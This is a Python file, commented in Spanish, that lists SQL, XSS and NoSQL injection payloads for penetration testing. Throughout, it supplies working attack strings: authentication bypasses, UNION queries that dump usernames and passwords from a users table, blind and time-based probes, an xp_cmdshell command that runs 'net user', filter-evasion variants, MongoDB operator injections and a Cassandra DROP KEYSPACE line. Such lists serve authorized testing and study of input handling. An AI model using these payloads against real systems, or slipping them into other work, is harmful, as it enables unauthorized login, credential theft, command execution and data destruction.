#payload_extended.py
# LISTA AMPLIADA DE PAYLOADS PARA PRUEBAS DE PENETRACIÓN

# -------------------- INYECCIONES SQL --------------------
payloadsSQL = [
    # Inyecciones básicas
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1' OR '1'='1' --",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 LIMIT 1 --",
    "\" OR \"1\"=\"1",
    
    # Inyecciones para bypass de autenticación
    "admin'--",
    "admin' OR '1'='1'--",
    "' OR '' = '",
    "' OR 1 --",
    "' OR '1'='1'/*",
    "') OR ('x'='x",
    "' OR 'x'='x';--",
    
    # Inyecciones avanzadas
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT 1,2,3--",
    "' AND 1=0 UNION SELECT 1,2,concat(database(),version())--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT null,table_name,null FROM information_schema.tables--",
    
    # Inyecciones para extracción de datos
    "' UNION SELECT 1,concat(username,':',password),3 FROM users--",
    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
    
    # Inyecciones ciegas (blind)
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)--",
    "' AND (SELECT SUBSTR(username,1,1) FROM users WHERE id=1)='a'--",
    
    # Inyecciones basadas en tiempo
    "' AND (SELECT SLEEP(5))--",
    "' OR (SELECT 1 FROM (SELECT SLEEP(5))A)--",
    "' AND IF(1=1, SLEEP(5), 0)--",
    "'; WAITFOR DELAY '0:0:5'--",
    
    # Inyecciones para diferentes bases de datos
    # MySQL
    "' OR 1=1 -- -",
    "' UNION SELECT @@version,null,null -- -",
    # SQL Server
    "' OR 1=1 -- ",
    "'; EXEC xp_cmdshell 'net user'; --",
    # Oracle
    "' OR 1=1 --",
    "' UNION SELECT null,banner FROM v$version--",
    # PostgreSQL
    "' OR 1=1; --",
    "' UNION SELECT null,version(); --",
    
    # Inyecciones para evadir filtros
    "' OR '1'/**/='1",
    "' OR+1=1--",
    "' UnIoN SeLeCt 1,2,3--",
    "' or/**/'1'='1",
    "' /*!50000OR*/ '1'='1'--",
    
    # Más variaciones
    "admin') OR ('1'='1'--",
    "') OR ('1' LIKE '1",
    "') OR 1=1#",
    "';EXEC('SEL' + 'ECT US' + 'ER')",
    "' OR ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>1--"
]

# -------------------- INYECCIONES XSS --------------------
payloadsXSS = [ 
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<input type='text' value='<script>alert(1)</script>'>",
    
    # Evasión de filtros
    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
    "<script>document.write('<img src=x onerror=alert(1)>');</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>window['alert'](1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1);//<</script>",
    "<script>/* */alert(1)/* */</script>",
    
    # XSS basados en eventos
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onresize=alert(1)>",
    "<div onmouseover=alert(1)>Hover me</div>",
    "<div onclick=alert(1)>Click me</div>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    
    # XSS mediante atributos
    "<img src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    "<video src=1 onerror=alert(1)>",
    "<body background=javascript:alert(1)>",
    "<table background=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    
    # XSS sin etiquetas script
    "<svg onload=alert(1)>",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<body onload=alert(1)>",
    
    # DOM XSS
    "<script>document.getElementById('vulnerable').innerHTML=location.hash.slice(1)</script>",
    "<script>eval(location.hash.slice(1))</script>",
    
    # XSS con codificación
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    "<iframe src=j&#x61;v&#x61;script:alert(1)></iframe>",
    
    # XSS Poliglot 
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></script>\">'><script>alert(String.fromCharCode(88,83,83))</script>",
    
    # XSS en diferentes contextos
    # Contexto HTML
    "<div>Hello, <script>alert(1)</script></div>",
    # Contexto atributo
    "<input value=\"hello\" onmouseover=\"alert(1)\">",
    # Contexto URL
    "<a href=\"javascript:alert(1)\">Click me</a>",
    # Contexto CSS
    "<style>body{background-image:url('javascript:alert(1)')}</style>",
]

    

# -------------------- INYECCIONES NoSQL --------------------
payloadsNoSQL = [
    # Inyecciones básicas para MongoDB
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"$gt": 0}',
    '{"$where": "this.password.match(/.*/)"}',
    '[$ne]=1',
    'username[$regex]=admin',
    'password[$ne]=invalid',
    
    # Inyecciones para bypass de autenticación
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}',
    'username[$eq]=admin&password[$regex]=.*',
    'username=admin&password[$ne]=invalid',
    
    # Inyecciones para extracción de datos
    '{"$where": "this.username != null"}',
    '{"$where": "return true"}',
    '{"$where": "sleep(5000)"}',
    '{"$where": "this.username.length > 0"}',
    
    # Inyecciones operadores de consulta
    '{"field": {"$gt": ""}}',
    '{"field": {"$gte": ""}}',
    '{"field": {"$lt": "z"}}',
    '{"field": {"$lte": "z"}}',
    '{"field": {"$nin": ["value1", "value2"]}}',
    '{"field": {"$in": ["value1", "value2"]}}',
    
    # Inyecciones para URL query params
    'username[$ne]=invalid&password[$ne]=invalid',
    'username[$exists]=true&password[$exists]=true',
    'username[$in][]=admin&password[$ne]=x',
    'username[$regex]=^admin&password[$ne]=x',
    
    # Inyecciones para evadir filtros
    '{"username":{"$regex":"^adm"}}',
    '{"username":"admin", "$or": [{"password":"123"}, {"$where":"1==1"}]}',
    '{"$where":"this.username == \'admin\' || 1==1"}',
    
    # Inyecciones NoSQL avanzadas
    '{"$func": "function() { return true; }"}',
    '{"$where": "function() { return this.username == \'admin\'; }"}',
    '{"$where": "new Date().getTime() > 0"}',
    '{"$accumulator": {"init": "function() {return true}"}}',
    
    # Inyecciones para MongoDB en formato URL
    'username[$eq]=admin&password[$regex]=^pass',
    'username[$eq]=admin&password[$options]=i&password[$regex]=^PASS',
    'username[$type]=string&password[$type]=string',
    
    # Inyecciones para MongoDB con operadores lógicos
    '{"$and": [{"username": "admin"}, {"$or": [{"password": "123"}, {"$where": "1==1"}]}]}',
    '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
    '{"$nor": [{"username": {"$ne": "admin"}}, {"password": {"$ne": ""}}]}',
    
    # Inyecciones para Otras bases NoSQL
    # CouchDB
    '{"selector": {"_id": {"$gt": null}}}',
    # Redis
    'EVAL "return redis.call(\'keys\',\'*\')" 0',
    # Cassandra
    '\'; DROP KEYSPACE test; --',
]
